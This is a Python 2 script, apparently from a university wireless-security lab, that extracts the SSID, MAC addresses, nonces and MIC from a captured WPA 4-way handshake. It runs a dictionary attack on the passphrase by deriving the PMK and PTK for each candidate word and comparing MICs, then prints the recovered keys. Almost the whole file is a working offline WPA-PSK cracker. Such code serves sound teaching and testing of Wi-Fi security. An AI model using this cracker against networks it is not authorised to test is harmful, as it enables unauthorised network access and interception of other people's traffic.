#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
- Derive WPA keys from Passphrase and 4-way handshake info

- Calculate an authentication MIC (the mic for data transmission uses the
Michael algorithm. In the case of authentication, we use SHA-1 or MD5)

- Find a simple passphrase from a dictionary using the known mic and the calculated mic
"""

__author__      = "Abraham Rubinstein"
__maintainer__  = ["Hayeon Yu", "Alison Savary"]
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex #contains function to calculate 4096 rounds on passphrase and SSID
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = ''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, open authentication, associacion, 4-way handshake and data
wpa=rdpcap("wpa_handshake.cap")
# We can find the SSID in the beacon frame, in the payload
ssid        = wpa[0].payload.info
# In the first frame of the handshake, we can get the MAC adresses of the AP (source) and the client (destination)
APmac       = a2b_hex(wpa[5].payload.addr2.replace(':','')) #MAC address of the AP
Clientmac   = a2b_hex(wpa[5].payload.addr1.replace(':','')) #MAC address of the client

# Authenticator and Supplicant Nonces
# We can get the ANonce from the first frame of the handshake
ANonce = a2b_hex(wpa[5].load[13:45].encode('hex'))
# SNonce from the second fram of the handshake
SNonce = a2b_hex(wpa[6].load[13:45].encode('hex'))

# Parameters from the original script
A           = "Pairwise key expansion" #this string is used in the pseudo-random function and should never be modified
B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

# MIC we want to obtain using the correct passphrase
mic_to_test = wpa[8].load[77:93].encode('hex')

# Data constitued by version, type and length
# We need to replace the MIC by '0's
eaversion = wpa[8][EAPOL].version
eatype = wpa[8][EAPOL].type
ealen = wpa[8][EAPOL].len
data = data = a2b_hex("%02x" % eaversion + "%02x" % eatype + "%04x" % ealen + b2a_hex(wpa[8][5].load[:77]).decode().ljust(190, '0'))

dictionary = open('test.txt', 'r')
count = 0 # Counter to see the progression

while True:
	#Read a word from dictionary and use it as the passphrase
	passPhrase = dictionary.readline()
	
	if not passPhrase:
		print "Passphrase not found"
		break

	passPhrase = passPhrase[:-1]

	#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
	pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
 
	#expand pmk to obtain PTK
	ptk = customPRF512(a2b_hex(pmk),A,B)

	#calculate our own MIC over EAPOL payload - The ptk is, in fact, KCK|KEK|TK|MICK
	mic = hmac.new(ptk[0:16],data,hashlib.sha1)

	#the MIC for the authentication is actually truncated to 16 bytes (32 chars). SHA-1 is 20 bytes long.
	MIC_hex_truncated = mic.hexdigest()[0:32]

	# We test the value of the calculated MIC with the value we want
	if (mic_to_test == MIC_hex_truncated):
		print "Passphrase found ! It is :", passPhrase
		break

	count = count + 1
	if (count % 500 == 0):
		print count, "passphrases tested"

dictionary.close()

# From the original script
#separate ptk into different keys - represent in hex
KCK = b2a_hex(ptk[0:16])
KEK = b2a_hex(ptk[16:32])
TK  = b2a_hex(ptk[32:48])
MICK = b2a_hex(ptk[48:64])

print "\n\nValues used to derivate keys"
print "============================"
print "Passphrase: ",passPhrase,"\n"
print "SSID: ",ssid,"\n"
print "AP Mac: ",b2a_hex(APmac),"\n"
print "CLient Mac: ",b2a_hex(Clientmac),"\n"
print "AP Nonce: ",b2a_hex(ANonce),"\n"
print "Client Nonce: ",b2a_hex(SNonce),"\n"

print "\nResults of the key expansion"
print "============================="
print "PMK:\t\t",pmk,"\n"
print "PTK:\t\t",b2a_hex(ptk),"\n"
print "KCK:\t\t",KCK,"\n"
print "KEK:\t\t",KEK,"\n"
print "TK:\t\t",TK,"\n"
print "MICK:\t\t",MICK,"\n"
print "MIC:\t\t",MIC_hex_truncated,"\n"
